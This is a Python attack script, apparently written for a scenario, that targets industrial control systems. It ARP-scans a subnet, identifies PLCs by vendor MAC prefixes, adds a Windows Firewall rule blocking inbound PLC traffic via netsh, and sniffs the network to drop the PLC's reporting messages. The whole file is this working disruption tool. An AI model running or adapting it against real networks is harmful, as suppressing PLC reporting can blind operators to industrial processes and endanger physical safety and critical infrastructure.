from scapy.all import *
import os
import time
import subprocess

# Function to determine the PLC's IP Address using ARP scan
def find_plc_ip(network_prefix):
    print("[*] Scanning for PLC in network range:", network_prefix)
    
    # Send ARP requests to discover devices in the network
    ans, _ = arping(network_prefix + "1/24", timeout=2, verbose=False)
    
    for sent, received in ans:
        print(f"[+] Possible device found: {received.psrc} ({received.hwsrc})")
        
        # Assuming PLC has a predefined MAC prefix (example: Siemens, Rockwell MAC ID ranges)
        plc_mac_prefixes = ["00:0E:A7", "00:80:41", "00:11:92"]
        
        for prefix in plc_mac_prefixes:
            if received.hwsrc.upper().startswith(prefix):
                print(f"[!] PLC Identified at: {received.psrc}")
                return received.psrc
    
    print("[-] No PLC found in network.")
    return None

# Function to block communication using Windows Firewall
def block_plc_traffic(plc_ip):
    print(f"[*] Blocking traffic from the PLC ({plc_ip}) using Windows Firewall")
    
    cmd = f'netsh advfirewall firewall add rule name="Block PLC" dir=in action=block remoteip={plc_ip}'
    result = subprocess.run(cmd, shell=True, capture_output=True)

    if result.returncode == 0:
        print("[+] Successfully blocked PLC communication.")
    else:
        print("[-] Failed to block PLC communication.")

# Function to block reporting messages using Scapy (Packet Filtering)
def block_reporting_messages(plc_ip):
    print(f"[*] Interfering with PLC Reporting Messages via Packet Filtering ({plc_ip})")

    def packet_callback(packet):
        if IP in packet and packet[IP].src == plc_ip:
            print("[!] Blocking Reporting Message from PLC:", packet.summary())
            return  # Drop the packet by not forwarding it

        send(packet)  # Forward other packets

    # Start sniffing packets and selectively drop PLC messages
    sniff(prn=packet_callback, store=0)

# Main Execution Workflow
if __name__ == "__main__":
    # Define the network prefix (Update according to scenario, e.g., "192.168.1.")
    network_prefix = "192.168.1."

    # Step 1: Find PLC IP
    plc_ip = find_plc_ip(network_prefix)

    if plc_ip:
        # Step 2: Block communication by modifying firewall rules
        block_plc_traffic(plc_ip)

        # Step 3: Use Scapy to monitor/block reporting messages in real time
        block_reporting_messages(plc_ip)
    else:
        print("[-] No PLC detected. Exiting.")